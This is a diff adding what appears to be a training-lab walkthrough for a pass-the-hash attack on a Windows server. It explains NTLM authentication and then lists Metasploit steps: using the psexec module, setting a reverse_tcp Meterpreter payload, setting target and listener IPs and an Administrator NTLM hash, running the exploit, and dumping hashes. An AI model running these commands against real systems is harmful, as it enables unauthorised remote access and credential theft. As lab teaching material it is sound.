@@ -1,0 +1,47 @@
+For a user to authenticate, the system must prove that it has access to the NTLM in the SAM file.
+
+NTLM uses a challenge-response authentication method. This means the client will receive a challenge from the server when they attempt to connect.
+The challenge will usually take the form of data, like a random number.
+The client will encrypt that data using a secret key based on a password and send it back to the server.
+
+Metasploit has a PSExec exploit module that allows users to run a Pass-the-Hash attack on a Windows server with a Reverse TCP Meterpreter payload.
+To successfully run this module you will need to provide it with the SMBUser, SMBPass, Remote Host IP, Local Host IP and the Meterpreter payload.
+The PSExec Pass-the-Hash guide from Offsec states that if ‘NTLM is only available (for example, it’s a 15+ character password or through GPO they specify NTLM response only), simply replace the ****NOPASSWORD**** with 32 0’s'.
+
+There are many options available to the user on the target server, including executing commands to run on the target or dumping hashes using Mter hashdump, a Meterpreter 'post' module.
+
+
+You will have to execute a Pass-the-Hash attack to gain access to the admin account and read the file located in the C:\token directory.
+You will need to set the SMBPass, SMBUser and payload using the credentials provided below.
+
+Payload: windows/x64/meterpreter/reverse_tcp
+
+Username: Administrator
+
+NTLM Hash: 00000000000000000000000000000000:A7BD002336399D61B4099A19771E4EF8
+
+
+1. use exploit
+
+    use exploit/windows/smb/psexec
+
+2. set payload
+
+    set payload windows/meterpreter/reverse_tcp
+
+3. show options
+
+4. set parameters
+
+    set RHOST 10.102.2.237
+    set LHOST 10.102.3.51
+    set SMBPass 00000000000000000000000000000000:A7BD002336399D61B4099A19771E4EF8
+    set SMBUser Administrator
+
+5. run exploit
+
+    exploit
+
+6. hashdump
+
+    run post/windows/gather/hashdump
